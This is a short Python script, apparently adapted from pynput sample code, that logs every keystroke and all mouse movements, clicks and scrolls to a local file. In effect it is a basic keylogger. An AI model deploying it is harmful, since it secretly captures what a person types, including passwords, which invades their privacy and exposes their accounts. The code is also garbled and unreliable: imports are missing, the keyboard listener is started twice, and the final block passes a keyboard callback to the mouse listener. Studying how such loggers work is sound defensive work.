logging.basicConfig(filename="mouse_log.txt", level=logging.DEBUG, format='')

def on_move(x, y):
    logging.info("Mouse moved to ({0}, {1})".format(x, y))

def on_click(x, y, button, pressed):
    if pressed:
        logging.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))

def on_scroll(x, y, dx, dy):
    logging.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))



def on_press(key):
    try:
        logging.info('{0}'.format(
            key.char))
    except AttributeError:
        logging.info('{0}'.format(
            key))

def on_release(key):
    
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()

with Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll,on_press=on_press) as listener:
    listener.join()
